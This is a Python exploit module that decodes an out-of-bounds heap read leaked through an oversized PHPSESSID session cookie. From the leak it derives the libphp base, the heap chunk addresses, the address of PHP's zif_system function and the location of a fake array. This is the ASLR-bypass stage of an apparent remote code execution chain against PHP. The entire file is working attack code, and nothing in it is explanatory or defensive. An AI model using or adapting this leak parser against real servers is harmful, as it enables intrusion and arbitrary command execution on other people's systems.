"""Decode the stale-session OOB read and recover the two heap bases."""
from __future__ import annotations

import struct
import urllib.parse
from collections import Counter
from dataclasses import dataclass, field

COOKIE_KEY = b"Set-Cookie: PHPSESSID="
CHUNK_MASK = ~0x1FFFFF
S_OFFSET = 0xF8398
MAIN_BUCKET_COUNT = 87


class LeakError(RuntimeError):
    pass


@dataclass
class Leak:
    decoded_len: int
    dtor: int
    dtor_count: int
    libphp: int
    main: int
    zif_system: int
    clusters: Counter = field(default_factory=Counter)
    id_chunk: int | None = None
    cookie_head: bytes = b""

    @property
    def s_addr(self) -> int:
        return self.main + S_OFFSET

    def summary(self) -> dict[str, object]:
        return {
            "decoded_len": self.decoded_len,
            "zval_ptr_dtor": hex(self.dtor),
            "dtor_count": self.dtor_count,
            "libphp": hex(self.libphp),
            "main_chunk": hex(self.main),
            "zif_system": hex(self.zif_system),
            "fake_array": hex(self.s_addr),
            "clusters": {hex(k): v for k, v in self.clusters.most_common(6)},
            "cookie_head": self.cookie_head[:16].decode("latin1", "replace"),
        }


def cookie_bytes(raw: bytes) -> bytes:
    index = raw.find(COOKIE_KEY)
    if index < 0:
        raise LeakError("response has no Set-Cookie: PHPSESSID")
    value = raw[index + len(COOKIE_KEY):].split(b"\r\n", 1)[0]
    if not value:
        raise LeakError("empty PHPSESSID cookie")
    return urllib.parse.unquote_to_bytes(value.decode("latin1"))


def parse_leak(raw: bytes, dtor_offset: int, zif_offset: int,
               main_bucket_count: int = MAIN_BUCKET_COUNT,
               s_offset: int = S_OFFSET) -> Leak:
    data = cookie_bytes(raw)
    if len(data) < 0x10000:
        raise LeakError("cookie is only %d bytes (no OOB read)" % len(data))

    dtor_counts: Counter = Counter()
    for off in range(0, len(data) - 8, 8):
        q = struct.unpack_from("<Q", data, off)[0]
        if not (0x100000 < q < 0x800000000000):
            continue
        lib = q - dtor_offset
        if lib > 0 and (lib & 0xFFF) == 0 and lib < 0x800000000000:
            dtor_counts[q] += 1

    if not dtor_counts:
        raise LeakError("no zval_ptr_dtor-shaped pointer in leak")
    dtor, dtor_count = dtor_counts.most_common(1)[0]
    if dtor_count < 50:
        raise LeakError("only %d candidate zval_ptr_dtor pointers" % dtor_count)
    libphp = dtor - dtor_offset

    clusters: Counter = Counter()
    for off in range(0, len(data) - 8, 8):
        q = struct.unpack_from("<Q", data, off)[0]
        if q == dtor or not (0x100000 < q < 0x800000000000):
            continue
        clusters[q & CHUNK_MASK] += 1

    if not clusters:
        raise LeakError("leak has no chunk pointer clusters")
    id_chunk, id_count = clusters.most_common(1)[0]
    lib_chunk = libphp & CHUNK_MASK

    candidates = [
        (base, count) for base, count in clusters.most_common()
        if base not in (id_chunk, lib_chunk)
    ]
    if not candidates:
        raise LeakError("no candidate main chunk")
    candidates.sort(key=lambda item: (abs(item[1] - main_bucket_count), -item[1]))
    main, main_count = candidates[0]
    if main_count < 20:
        raise LeakError("weak main-chunk cluster (%d pointers)" % main_count)
    if not (0 <= s_offset < 0x200000):
        raise LeakError("fake-array offset outside main chunk")

    return Leak(
        decoded_len=len(data),
        dtor=dtor,
        dtor_count=dtor_count,
        libphp=libphp,
        main=main,
        zif_system=libphp + zif_offset,
        clusters=clusters,
        id_chunk=id_chunk,
        cookie_head=data[:16],
    )
